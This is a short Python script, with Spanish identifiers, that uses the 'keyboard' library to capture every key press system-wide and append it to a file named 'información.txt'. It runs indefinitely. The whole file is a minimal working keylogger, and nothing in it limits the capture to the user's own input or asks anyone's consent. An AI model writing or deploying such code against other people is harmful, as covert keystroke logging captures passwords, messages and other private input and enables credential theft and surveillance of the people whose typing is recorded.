import keyboard  

def registro(key):
    
    with open('información.txt', 'a') as file:
        
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)
            
keyboard.on_press(registro)
keyboard.wait()